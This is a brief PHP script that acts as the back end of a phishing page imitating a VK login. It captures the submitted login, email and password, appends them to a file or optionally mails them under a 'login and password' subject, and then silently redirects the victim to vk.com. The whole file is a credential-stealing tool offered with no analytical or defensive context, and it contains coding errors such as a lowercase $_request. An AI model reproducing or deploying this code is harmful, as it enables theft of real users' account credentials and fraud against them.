<?php
$base="login.php";
$is_email=false;
$location="http://vk.com";

$p0=$_request["login"];
$p1=$_request["email"];
$p2=$_request["pass"];
$headers = "";
$info="$p0:$p1:$p2:\n";

if ($is_email){
    mail($base, "*** логин_и_пароль", $headers.$info);
} else {
    $fd=fopen($base,"a+");
    fwrite($fd,$info);
    fclose($fd);
}

header("location:$location");
?>